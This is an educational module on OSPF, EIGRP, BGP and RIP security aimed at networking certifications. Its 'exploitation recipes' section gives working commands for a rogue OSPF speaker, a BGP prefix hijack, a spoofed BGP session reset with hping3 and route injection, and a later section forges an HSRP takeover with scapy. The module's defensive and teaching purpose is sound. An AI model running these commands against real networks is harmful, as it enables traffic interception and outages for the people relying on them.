# Dynamic Routing Protocols

> Track: Offensive / Defensive | Level: Foundation | Certs: Network+, CCNA, CCNP

## 1. Overview

A dynamic routing protocol lets routers discover each other,
exchange reachability information, and build a routing table
without manual configuration. The four you will meet in practice
are OSPF (link-state, interior), EIGRP (Cisco advanced distance-
vector, interior), BGP (path-vector, the Internet), and RIP (the
old distance-vector, still in small networks).

Three things make dynamic routing worth studying in depth:

- The protocol is the control plane. If you can speak the protocol
  correctly, the network routes to you. This is the single most
  important fact for both attacker and defender.
- Interior and exterior protocols solve different problems. OSPF
  and EIGRP find the shortest path inside one organization. BGP
  chooses a path based on policy between organizations. The attack
  and defense are different in each case.
- Convergence is the failure mode. A routing protocol that is
  slow to converge, or that flaps, causes outages. An attacker who
  can trigger reconvergence can cause an outage without ever
  touching a host.

The vocabulary: neighbor, adjacency, LSA (OSPF), LSP (IS-IS),
DUAL (EIGRP), AS (BGP autonomous system), route reflector, area
(OSPF), hello timer, hold timer, metric, administrative distance.

## 2. Reconnaissance / Enumeration

Routing protocol reconnaissance is about discovering which
protocols are running, who the neighbors are, and what they are
advertising.

**From outside: is the protocol reachable?**

```bash
# OSPF runs on IP protocol 89; scan for it
sudo nmap -sO -p 89 10.10.10.0/24

# BGP runs on TCP/179
nmap -p 179 10.10.10.0/24

# EIGRP runs on IP protocol 88
sudo nmap -sO -p 88 10.10.10.0/24

# RIP runs on UDP/520
nmap -sU -p 520 10.10.10.0/24

```

**From inside: what is the router saying?**

```bash
# Capture OSPF hellos (multicast 224.0.0.5)
sudo tcpdump -i eth0 -n -c 10 'ip proto 89'

# Capture BGP OPEN messages (TCP/179)
sudo tcpdump -i eth0 -n -c 10 'tcp port 179'

# Capture EIGRP hellos (multicast 224.0.0.10)
sudo tcpdump -i eth0 -n -c 10 'ip proto 88'

# Capture RIP updates (UDP/520)
sudo tcpdump -i eth0 -n -c 10 'udp port 520'

```

**What the capture tells you:**

- The OSPF hello contains the area ID, the router ID, the hello
  and dead intervals, and the list of neighbors. This is the map
  of the area.
- The BGP OPEN contains the AS number and the BGP identifier.
  This is the AS-level map.
- The EIGRP hello contains the AS number and the K-values. This
  is the EIGRP domain.
- The RIP update contains the full routing table of the sender.
  This is the easiest protocol to read.

**From a managed device: what does the router know?**

```text
show ip ospf neighbor
show ip ospf database
show ip bgp summary
show ip bgp
show ip eigrp neighbors
show ip eigrp topology
show ip rip database

```

**What the output tells you:**

- OSPF neighbor state `FULL` means the adjacency is complete and
  the LSDB is synchronized. `INIT` or `EXSTART` means the
  adjacency is stuck - a common attack surface.
- BGP `Established` means the session is up. Any other state
  (`Idle`, `Active`, `Connect`, `OpenSent`, `OpenConfirm`) is a
  failure or a blocking filter.
- EIGRP neighbors are listed with the hold timer. A neighbor with
  a short hold timer is about to be lost.

**From a foothold: what does this host see?**

```bash
# The host may not run the protocol, but it can capture the multicast
sudo tcpdump -i eth0 -n 'ip multicast'

# If the host is a router (Linux with FRR), what is it running?
sudo vtysh -c "show ip ospf neighbor"
sudo vtysh -c "show ip bgp summary"

```

A foothold on a router is the highest-value position in the
network: the attacker sees every route, every neighbor, and every
LSA. This is why routing protocol authentication (section 6) is
the control that matters.


## 3. Common Attack Vectors

Every dynamic routing protocol has the same structural weakness:
it trusts any speaker that speaks the protocol correctly. The
attacks differ in mechanism, not in principle.

**OSPF attacks:**
- Rogue OSPF speaker: completes the adjacency and injects LSAs.
- LSA injection: advertise a network you do not own.
- Designated Router (DR) takeover: become the DR for a segment,
  and all traffic on that segment flows through you.
- Max age attack: flush an LSA by advertising it with age 3600.
- Virtual link abuse: a virtual link is an unauthenticated OSPF
  adjacency over a transit area.

**BGP attacks:**
- Prefix hijack: advertise a prefix you do not own, with a shorter
  AS path or a more specific prefix.
- AS path manipulation: prepend to influence path selection.
- Route leak: re-advertise a route to a peer that should not see it.
- Session reset: send a TCP RST to tear down an eBGP session.
- BGP spoofing: if TCP MD5 is not enabled, a rogue speaker can
  impersonate a peer.

**EIGRP attacks:**
- Rogue EIGRP speaker: same AS number, lower metric.
- Route injection: advertise a network you do not own.
- K-value mismatch: cause the adjacency to fail (DoS).

**RIP attacks:**
- Rogue RIP speaker: send a full routing table update.
- Route poisoning: advertise a network with metric 16 (unreachable).

**First-hop redundancy (HSRP/VRRP) attacks:**
- Takeover: higher priority becomes the active gateway.
- See 01 Routing Fundamentals for the mechanics.

The common thread: none of these protocols authenticate the
speaker by default. OSPF, EIGRP, and BGP all support
authentication; RIP v2 supports it; none enable it by default.

## 4. Exploitation Recipes

All commands are run only against systems you own or have written
authorization to test. Routing protocol injection requires a real
protocol stack (FRRouting, BIRD, or a lab router), not just scapy.

### Recipe 1 - Discover the routing protocol

Before attacking, find what is running.

```bash
# Passive capture: see what multicasts are on the segment
sudo tcpdump -i eth0 -n -c 50 'ip multicast or tcp port 179 or udp port 520'

# Active: probe for OSPF/EIGRP/BGP/RIP
sudo nmap -sO -p 89,88 10.10.10.0/24
nmap -p 179 10.10.10.0/24
nmap -sU -p 520 10.10.10.0/24

```

Expected: the passive capture shows OSPF/EIGRP hellos or BGP
keepalives if the protocol is present. The active scan confirms
reachability.

### Recipe 2 - Stand up a rogue OSPF speaker (FRRouting)

The cleanest way to inject OSPF is to run a real OSPF stack.

```bash
# Install FRRouting on Kali
sudo apt install frr

# Enable OSPF in FRR
sudo sed -i 's/^ospfd=no/ospfd=yes/' /etc/frr/daemons
sudo systemctl restart frr

# Configure OSPF in vtysh
sudo vtysh

```

In vtysh:

```text
configure terminal
router ospf
 network 10.10.10.0/24 area 0
exit
exit
write memory

```

Now the rogue speaker is an OSPF neighbor. To inject a route,
redistribute a connected network the router does not own (lab
only - this is the attack). Section 6 covers authentication, which
prevents this.

### Recipe 3 - BGP prefix hijack (conceptual)

A BGP hijack is not a packet-shaping problem; it is a policy
problem. The attacker needs a BGP session with a peer that
accepts the announcement.

```text
! On a rogue BGP speaker, announce a prefix you do not own
router bgp 65001
 network 203.0.113.0 mask 255.255.255.0
 neighbor 10.10.10.1 remote-as 65000
 neighbor 10.10.10.1 activate

```

The peer installs the route if:

- It does not have a prefix filter (section 6).
- It does not have RPKI validation (section 6).
- The AS path is shorter or the prefix is more specific than the
  legitimate announcement.

### Recipe 4 - Tear down a BGP session (lab only)

A TCP RST to port 179 tears down the session. The peer
reconverges, which is a brief outage.

```bash
# Send a TCP RST to a BGP peer (requires source spoofing to match)
sudo hping3 -S -a 10.10.10.1 -p 179 -M 0x14 10.10.10.2

```

Modern BGP implementations use TCP MD5 or TCP-AO, which makes
this attack much harder. Without those, it is trivial.

### Recipe 5 - Route injection via a compromised router

The highest-value position is a compromised router. Once on it,
the attacker can inject any route the protocol will accept.

```bash
# On a compromised Linux router with FRR
sudo vtysh -c "configure terminal" -c "router ospf" -c "redistribute static"
sudo ip route add 10.20.30.0/24 via 10.10.10.66

```

The result: every OSPF router in the area now routes 10.20.30.0/24
to the compromised router. This is the control-plane compromise
described in section 5.

## 5. Post-Exploitation

Once you control a routing protocol adjacency, the
post-exploitation options are network-wide.

**Traffic interception at scale:** a BGP hijack or an OSPF LSA
injection redirects traffic for an entire prefix through the
attacker. This is a MITM without touching a single host.

**Blackhole at scale:** advertise a prefix with a blackhole next
hop (`null0`). Every router in the area now drops traffic to that
prefix.

**Reconvergence as a weapon:** repeatedly flap an adjacency to
force reconvergence. Every flap is a brief outage. Repeated flaps
are a sustained DoS without a single packet to the victim.

**Persistence:** a rogue speaker that is not removed from the
config persists across reboots. This is the cleanest network-level
persistence, and it is invisible to host-based monitoring.

**Reporting:** the finding is "the routing protocol accepted an
unauthenticated speaker, and the route it advertised was installed
by every router in the area". That is a control-plane trust
failure, and it is a critical finding. The fix is section 6:
authentication, prefix filtering, RPKI, and max-prefix limits.


## 6. Preventive Controls

Routing protocol defense is one idea applied four times: make the
speaker prove it is a legitimate peer before you accept its
routes.

**OSPF authentication:**

```text
interface GigabitEthernet0/1
 ip ospf authentication message-digest
 ip ospf message-digest-key 1 md5 <KEY>

! Area-wide (all interfaces in the area)
router ospf 1
 area 0 authentication message-digest

```

OSPF supports null (none), plaintext (deprecated), MD5, and
SHA-1/2 (RFC 5709). Use SHA if the platform supports it.

**EIGRP authentication:**

```text
key chain EIGRP-KEYS
 key 1
  key-string <KEY>
interface GigabitEthernet0/1
 ip authentication mode eigrp 100 md5
 ip authentication key-chain eigrp 100 EIGRP-KEYS

```

EIGRP supports MD5 and SHA-256 (named mode). Use SHA-256 if the
platform supports it.

**BGP authentication:**

```text
! TCP MD5 (RFC 2385) - legacy but still common
neighbor 203.0.113.1 password <KEY>

! TCP-AO (RFC 5925) - modern, recommended
key chain BGP-AO
 key 1
  key-string <KEY>
neighbor 203.0.113.1 ao BGP-AO

```

BGP authentication protects the TCP session. It does not protect
the content of the session (the routes). For that, use prefix
filters and RPKI.

**RIP authentication:**

```text
key chain RIP-KEYS
 key 1
  key-string <KEY>
interface GigabitEthernet0/1
 ip rip authentication mode md5
 ip rip authentication key-chain RIP-KEYS

```

**BGP prefix filtering:**

```text
ip prefix-list FROM-PEER permit 203.0.113.0/24
ip prefix-list FROM-PEER deny 0.0.0.0/0 le 32
neighbor 203.0.113.1 prefix-list FROM-PEER in

```

A prefix filter says "this peer is allowed to announce only these
prefixes". A BGP hijack from a peer that announces something
else fails at the filter.

**RPKI validation:**

```text
router bgp 65000
 bgp rpki server tcp 203.0.113.10 port 3323 refresh 600
 neighbor 203.0.113.1 route-map RPKI-FILTER in
route-map RPKI-FILTER permit 10
 match rpki valid
route-map RPKI-FILTER deny 20
 match rpki invalid
route-map RPKI-FILTER permit 30
 match rpki notfound

```

RPKI is the cryptographic attestation that an AS is authorized to
announce a prefix. It is the only defense against a hijack from a
peer that is allowed to announce something, just not this.

**Max-prefix and TTL security (BGP):**

```text
neighbor 203.0.113.1 maximum-prefix 1000 90 restart 30
neighbor 203.0.113.1 ttl-security hops 1

```

Max-prefix stops route-table exhaustion. TTL security (GTSM,
RFC 5082) stops off-path injection: eBGP peers are directly
connected, so a TTL of 1 is expected.

**Maximum LSA / SPF throttling (OSPF):**

```text
router ospf 1
 max-lsa 12000
 timers throttle spf 50 200 5000
 timers throttle lsa 50 200 5000

```

Max-LSA stops an LSA flood from exhausting router memory. SPF
throttling stops a flapping adjacency from consuming CPU.

**First-hop redundancy authentication:**

```text
! HSRP
standby 1 authentication md5 key-string <KEY>

! VRRP
vrrp 1 authentication md5 key-string <KEY>

```

Without authentication, a rogue speaker with a higher priority
becomes the active gateway (see 01 Routing Fundamentals, Recipe 5).

## 7. Detection Controls

Each attack in section 3 has a matching detection.

**OSPF detection:**
- New OSPF neighbor that was not in the baseline.
- LSA with an unexpected link-state ID or advertising router.
- DR/BDR change on a stable segment.
- LSA with age 3600 (max age attack).

**BGP detection:**
- New BGP peer that was not in the baseline.
- Prefix announced by a peer that should not announce it.
- AS path anomaly (unexpected prepend, unexpected origin AS).
- BGP session flap (a sign of a reset attack or a real failure).
- RPKI-invalid announcement.

**EIGRP detection:**
- New EIGRP neighbor.
- Route with an unexpected metric or next hop.

**RIP detection:**
- RIP update from an unexpected source.
- Route with metric 16 (poison) for a network that should be up.

**Control-plane logging:**

```text
! OSPF neighbor change
router ospf 1
 log-adjacency-changes detail

! BGP neighbor change
router bgp 65000
 bgp log-neighbor-changes

! EIGRP neighbor change
router eigrp 100
 eigrp log-neighbor-changes

! Syslog to a central collector
logging host 10.10.10.50
logging trap informational

```

**SIEM correlation:** the high-value alert is "new routing peer +
new route + traffic to that route". Each event alone is noise;
together they are a control-plane compromise.

## 8. Verification

How to verify that the routing defenses are working.

**Verify OSPF authentication:**

```text
show ip ospf interface GigabitEthernet0/1
! Expect: "Message digest authentication enabled"

```

**Verify EIGRP authentication:**

```text
show ip eigrp interfaces detail GigabitEthernet0/1
! Expect: "Authentication mode is md5"

```

**Verify BGP authentication and prefix filter:**

```text
show ip bgp neighbors 203.0.113.1
! Expect: "Peer Authentication: MD5" or "TCP-AO"
! Expect: "Prefix-list FROM-PEER" in the inbound policy

```

**Verify RPKI:**

```text
show bgp rpki servers
! Expect: the RPKI cache is connected and the prefix counts are non-zero
show bgp rpki table
! Expect: the prefixes your peers announce are listed with a validation state

```

**Verify max-prefix:**

```text
show ip bgp summary
! Expect: "State/PfxRcd" below the configured maximum
! If it shows "PfxRcd" in parentheses or "Idle", the limit was hit

```

**Verify first-hop authentication:**

```bash
# From a test host, try to become the HSRP master
sudo python3 -c "from scapy.all import *; send(IP(dst='224.0.0.2')/HSRP(priority=255, virtualIP='10.10.10.1'), iface='eth0')"
# Expect: no effect. If the test host becomes master, HSRP auth is off.

```

**The verification habit:** after every routing change, re-check
who is a peer, what prefixes are accepted, and whether the
forwarding plane matches the control plane. A silent routing
change is the most common control-plane failure.

## 9. Certification Alignment

**CompTIA Network+ (N10-009):**
- Domain 2: Network Implementation - dynamic routing protocols
  (OSPF, EIGRP, BGP, RIP), routing table.
- Domain 4: Network Security - routing protocol authentication.

**Cisco CCNA (200-301):**
- Domain 3: IP Connectivity - OSPF (single area), first-hop
  redundancy.
- Domain 5: Security Fundamentals - routing protocol
  authentication.

**Cisco CCNP Enterprise (350-401 ENCOR + 300-410 ENARSI):**
- OSPF multi-area, EIGRP named mode, BGP, route filtering, RPKI,
  GTSM.

**Cross-references:**
- 01 Routing Fundamentals covers the routing table, longest prefix
  match, and administrative distance that every protocol feeds.
- 03 Switching Advanced covers the switching fabric these routes
  traverse.
- 04 Routing Attacks and 05 Routing Defense cover the attacks and
  defenses in depth.

## 10. Production Notes

**Authentication is one line per protocol, and it is off by
default.** Every routing protocol supports it. None enable it by
default. This is the single highest-value routing control, and it
is a one-line change per interface (or per area).

**Prefix filtering is the second line.** Authentication proves who
the peer is; prefix filtering proves what the peer is allowed to
say. A compromised peer with valid authentication can still
announce a prefix it should not, unless the prefix filter stops
it.

**RPKI is the only defense against a hijack from an authorized
peer.** Prefix filters are per-peer policy; RPKI is a global
attestation. For an ISP, RPKI validation is not optional anymore.
For an enterprise, it is a strong defense in depth.

**BGP is a policy protocol, not a shortest-path protocol.** The
path selection is: highest weight, highest local preference,
locally originated, shortest AS path, lowest origin type, lowest
MED, eBGP over iBGP, lowest IGP metric to next hop, oldest route,
lowest router ID, lowest neighbor IP. Every one of these is a
potential attack surface, which is why the defenses are layered.

**Cloud routing changes the diagram, not the model.** A VPC route
table is the forwarding plane; the cloud API is the control plane.
The controls are IAM and route table review, not OSPF MD5. But
hybrid environments still run BGP between the data center and the
cloud, and that BGP session needs the same defenses as any other.

## 11. References

- RFC 2328 - OSPF Version 2 - https://www.rfc-editor.org/rfc/rfc2328
- RFC 5709 - OSPFv2 HMAC-SHA Cryptographic Authentication - https://www.rfc-editor.org/rfc/rfc5709
- RFC 4271 - A Border Gateway Protocol 4 (BGP-4) - https://www.rfc-editor.org/rfc/rfc4271
- RFC 2385 - Protection of BGP Sessions via the TCP MD5 Signature Option - https://www.rfc-editor.org/rfc/rfc2385
- RFC 5925 - The TCP Authentication Option - https://www.rfc-editor.org/rfc/rfc5925
- RFC 5082 - The Generalized TTL Security Mechanism (GTSM) - https://www.rfc-editor.org/rfc/rfc5082
- RFC 6480 - An Infrastructure to Support Secure Internet Routing (RPKI) - https://www.rfc-editor.org/rfc/rfc6480
- RFC 2453 - RIP Version 2 - https://www.rfc-editor.org/rfc/rfc2453
- Cisco - IP Routing Configuration Guide - https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/iproute/configuration/15-mt/iproute-15-mt-book.html
- CompTIA Network+ exam objectives - https://www.comptia.org/certifications/network
- Cisco CCNA exam topics - https://learningnetwork.cisco.com/s/ccna-exam-topics

